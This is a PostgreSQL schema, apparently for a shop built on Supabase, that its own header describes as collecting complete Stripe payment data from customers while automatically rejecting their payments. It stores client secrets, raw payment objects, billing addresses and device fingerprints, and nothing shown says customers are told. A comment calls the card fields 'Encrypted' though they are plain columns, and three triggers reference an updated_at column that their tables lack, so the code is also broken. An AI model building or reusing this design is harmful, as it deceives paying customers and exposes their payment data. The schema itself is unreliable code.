-- Stripe Data Collection Schema for Customer Attempts
-- This schema allows collecting complete Stripe payment data from customers
-- while automatically rejecting their payments for security review

-- Customer Stripe Attempts (Data Collection Table)
CREATE TABLE IF NOT EXISTS customer_stripe_attempts (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    
    -- Customer Information
    customer_id UUID NOT NULL REFERENCES auth.users(id),
    customer_name VARCHAR(255) NOT NULL,
    customer_email VARCHAR(255) NOT NULL,
    customer_phone VARCHAR(50),
    
    -- Order Information
    order_id VARCHAR(50) NOT NULL,
    order_amount DECIMAL(10,2) NOT NULL,
    
    -- Stripe Payment Data (Full Collection)
    stripe_payment_method_id VARCHAR(255),
    stripe_payment_intent_id VARCHAR(255),
    stripe_client_secret VARCHAR(255),
    
    -- Card Details (Encrypted)
    card_last4 VARCHAR(4),
    card_brand VARCHAR(20),
    card_exp_month INTEGER,
    card_exp_year INTEGER,
    card_funding VARCHAR(20), -- 'credit', 'debit'
    card_country VARCHAR(2),
    
    -- Billing Details
    billing_name VARCHAR(255),
    billing_email VARCHAR(255),
    billing_phone VARCHAR(50),
    billing_address_line1 VARCHAR(255),
    billing_address_city VARCHAR(100),
    billing_address_state VARCHAR(100),
    billing_address_country VARCHAR(2),
    billing_address_zip VARCHAR(20),
    
    -- Status
    status VARCHAR(50) DEFAULT 'data_collected_pending_rejection',
    rejection_reason VARCHAR(255) DEFAULT 'auto_rejected_security_policy',
    
    -- Admin Review Fields
    reviewed_by UUID REFERENCES auth.users(id),
    reviewed_at TIMESTAMP,
    admin_notes TEXT,
    manual_override BOOLEAN DEFAULT FALSE, -- If admin manually approves
    
    -- Security & Audit
    ip_address INET,
    user_agent TEXT,
    device_fingerprint TEXT,
    
    -- Raw Data (JSON for complete record)
    raw_payment_data JSONB, -- Full Stripe paymentMethod object
    raw_metadata JSONB, -- Additional metadata
    
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW()
);

-- Create indexes for performance
CREATE INDEX IF NOT EXISTS idx_customer_stripe_status ON customer_stripe_attempts (status, created_at);
CREATE INDEX IF NOT EXISTS idx_customer_stripe_customer ON customer_stripe_attempts (customer_id, created_at);
CREATE INDEX IF NOT EXISTS idx_stripe_pending_review ON customer_stripe_attempts (status) WHERE status = 'data_collected_pending_rejection';

-- Admin alerts for new Stripe attempts
CREATE TABLE IF NOT EXISTS admin_stripe_alerts (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    stripe_attempt_id UUID REFERENCES customer_stripe_attempts(id),
    admin_id UUID REFERENCES auth.users(id),
    alert_type VARCHAR(50) DEFAULT 'new_stripe_attempt',
    message TEXT,
    viewed BOOLEAN DEFAULT FALSE,
    priority VARCHAR(20) DEFAULT 'high',
    created_at TIMESTAMP DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_admin_stripe_alerts_admin ON admin_stripe_alerts (admin_id, viewed);
CREATE INDEX IF NOT EXISTS idx_admin_stripe_alerts_type ON admin_stripe_alerts (alert_type, created_at);

-- Security logs for Stripe events
CREATE TABLE IF NOT EXISTS stripe_security_logs (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID REFERENCES auth.users(id),
    event_type VARCHAR(100),
    event_data JSONB,
    severity VARCHAR(20) DEFAULT 'medium',
    flagged BOOLEAN DEFAULT FALSE,
    ip_address INET,
    user_agent TEXT,
    created_at TIMESTAMP DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_stripe_security_user ON stripe_security_logs (user_id, created_at);
CREATE INDEX IF NOT EXISTS idx_stripe_security_type ON stripe_security_logs (event_type, created_at);
CREATE INDEX IF NOT EXISTS idx_stripe_security_flagged ON stripe_security_logs (flagged, created_at);

-- Suspicious activities detection
CREATE TABLE IF NOT EXISTS suspicious_stripe_activities (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID REFERENCES auth.users(id),
    activity_type VARCHAR(100),
    attempt_count INTEGER,
    time_window VARCHAR(20),
    status VARCHAR(50) DEFAULT 'needs_review',
    details JSONB,
    created_at TIMESTAMP DEFAULT NOW(),
    resolved_at TIMESTAMP,
    resolved_by UUID REFERENCES auth.users(id)
);

CREATE INDEX IF NOT EXISTS idx_suspicious_activities_user ON suspicious_stripe_activities (user_id, status, created_at);

-- Update triggers
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Apply triggers
DROP TRIGGER IF EXISTS update_customer_stripe_attempts_updated_at ON customer_stripe_attempts;
CREATE TRIGGER update_customer_stripe_attempts_updated_at 
    BEFORE UPDATE ON customer_stripe_attempts 
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

DROP TRIGGER IF EXISTS update_admin_stripe_alerts_updated_at ON admin_stripe_alerts;
CREATE TRIGGER update_admin_stripe_alerts_updated_at 
    BEFORE UPDATE ON admin_stripe_alerts 
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

DROP TRIGGER IF EXISTS update_stripe_security_logs_updated_at ON stripe_security_logs;
CREATE TRIGGER update_stripe_security_logs_updated_at 
    BEFORE UPDATE ON stripe_security_logs 
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

DROP TRIGGER IF EXISTS update_suspicious_stripe_activities_updated_at ON suspicious_stripe_activities;
CREATE TRIGGER update_suspicious_stripe_activities_updated_at 
    BEFORE UPDATE ON suspicious_stripe_activities 
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
